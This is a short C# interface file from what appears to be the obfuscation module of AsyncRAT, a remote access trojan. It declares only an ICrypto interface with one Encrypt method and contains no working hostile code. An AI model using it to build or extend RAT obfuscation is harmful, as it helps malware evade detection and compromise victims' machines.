using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace AsyncRAT_Sharp.RenamingObfuscation.Interfaces
{
    public interface ICrypto
    {
        string Encrypt(string dataPlain);
    }
}
